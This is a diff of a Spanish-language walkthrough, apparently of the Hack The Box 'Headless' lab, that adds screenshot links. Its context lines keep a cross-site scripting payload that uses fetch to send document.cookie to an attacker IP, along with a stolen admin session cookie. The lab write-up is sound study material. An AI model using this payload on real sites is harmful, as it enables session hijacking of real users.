@@ -52,11 +52,24 @@ Después de probar con algunos xss decido probar por otro lado a ver si funciona
 <img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
 ```
 
-
-
 cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"
 
 ![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/9f4cb784-9d61-481b-928a-ddba6b524c6b)
 
 <img width="284" alt="image" src="https://github.com/0111100/HTB-HEADLESS/assets/96475451/a8052521-7db3-4894-8342-b01049d930a4">
 
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/b68edf39-9e86-499a-8c37-2eca9830b174)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/75378874-c1d1-4c2b-bbcd-beef2b1602d0)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/73428c24-ed07-4899-bb0e-a78eb2c43f3b)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ad2d1ffb-445b-42df-a178-6521a399b907)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ef519537-4488-459c-ab50-e8887d954826)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/1db49c30-e4b8-4324-a3a6-919e955efb91)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/2b547132-09ac-47f5-8799-bbdc674e991d)
+
+![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ea9720f4-2e2c-44a7-857f-2fad1f1b0ab7)
